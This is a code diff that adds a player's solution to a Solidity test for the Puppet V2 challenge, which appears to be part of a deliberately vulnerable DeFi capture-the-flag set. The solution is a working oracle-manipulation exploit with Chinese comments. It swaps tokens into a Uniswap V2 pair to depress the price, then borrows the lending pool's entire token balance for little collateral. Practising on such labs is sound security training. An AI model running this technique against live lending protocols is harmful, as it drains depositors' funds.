@@ -98,7 +98,31 @@ contract PuppetV2Challenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_puppetV2() public checkSolvedByPlayer {
-        
+        // 并未规定必须在一笔交易内完成，可以不用exploit合约
+
+        // uint256 required = lendingPool.calculateDepositOfWETHRequired(1e18);
+        // console.log("1e18 token `required weth: %e", required);
+
+        // swap
+        // 构建paths
+        address[] memory path = new address[](2);
+        path[0] = address(token);
+        path[1] = address(weth);
+        // swap：用 token 换 ETH（不是WETH）
+        token.approve(address(uniswapV2Router), PLAYER_INITIAL_TOKEN_BALANCE);
+        uniswapV2Router.swapExactTokensForETH(PLAYER_INITIAL_TOKEN_BALANCE, 0, path, player, block.timestamp);
+
+        // lend
+        // 需要的ETH数量
+        uint256 equiredETH = lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);
+        // 满足该条件才能进行下面逻辑
+        require(player.balance >= equiredETH);
+        weth.deposit{value: equiredETH}();
+        weth.approve(address(lendingPool), equiredETH);
+        lendingPool.borrow(POOL_INITIAL_TOKEN_BALANCE);
+
+        // 按目标条件
+        token.transfer(recovery, POOL_INITIAL_TOKEN_BALANCE);
     }
 
     /**
